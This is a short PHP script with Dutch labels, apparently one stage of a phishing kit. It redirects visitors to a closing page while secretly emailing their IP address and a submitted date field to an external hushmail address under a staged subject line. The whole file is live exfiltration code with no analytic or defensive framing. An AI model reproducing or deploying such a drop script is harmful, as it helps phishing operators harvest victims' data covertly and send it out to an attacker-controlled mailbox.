<?php
header("Location: afsluiten.html");
$IP = $_SERVER['REMOTE_ADDR'];

$to = "finoknaller@hushmail.com";

$message = "Wanneer: " . $_GET['Datum'] . "\n";
$message .= "IPadres:" . $logdetails=  date("F j, Y, g:i a") . ': ' . '<a target=_blank href=http://www.dnsstuff.com/tools/ipall.ch?domain='.$_SERVER['REMOTE_ADDR'].'>'.$_SERVER['REMOTE_ADDR'].'</a>';


mail($to, '(4)ARROOKD - '.$_SERVER['REMOTE_ADDR'].'', $message);
exit;
?>